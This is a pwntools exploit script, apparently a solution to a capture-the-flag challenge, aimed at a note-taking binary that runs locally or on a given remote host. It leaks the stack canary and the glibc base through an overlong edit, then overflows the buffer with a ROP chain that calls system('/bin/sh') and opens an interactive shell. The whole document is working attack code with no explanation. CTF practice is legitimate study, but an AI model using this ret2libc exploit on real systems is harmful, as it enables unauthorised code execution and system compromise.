#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, ROP, sys, u64


context.binary = 'chall'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def create(index: int, text: bytes, date: tuple[int, int, int], size: bytes = b'l'):
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'> ', str(index).encode())
    io.sendlineafter(b'Choose note size [(S)mall/(m)edium/(l)arge]: ', size)
    io.sendafter(b'Input your text: ', text)
    io.sendlineafter(b'Keep changes? [y/N]: ', b'y')
    io.sendlineafter(b"Set the note's date (format: dd/mm/yy):\n", '{}/{}/{}'.format(*date).encode())


def edit(index: int, text: bytes, yn: bytes = b'n') -> bytes:
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(index).encode())
    return re_edit(text, yn)


def re_edit(text: bytes, yn: bytes = b'n') -> bytes:
    io.sendafter(b'Input your text: ', text)
    res = io.recvuntil(b'\nKeep changes? [y/N]: ', drop=True)
    io.sendline(yn)
    return res if yn == b'n' else b''


io = get_process()

create(0, b'A', (-1, -1, -1))

canary = u64(b'\0' + edit(0, b'A' * 265).split(b'A' * 265)[1][:7])
glibc.address = u64(re_edit(b'A' * 360).split(b'A' * 360)[1].ljust(8, b'\0')) - 0x2718a

io.success(f'Canary: {hex(canary)}')
io.success(f'Glibc base address: {hex(glibc.address)}')

rop = ROP(glibc)

payload  = b'A' * 264
payload += p64(canary)
payload += b'A' * 8
payload += p64(rop.ret.address)
payload += p64(rop.rdi.address)
payload += p64(next(glibc.search(b'/bin/sh')))
payload += p64(glibc.sym.system)

re_edit(payload , b'y')

io.interactive()
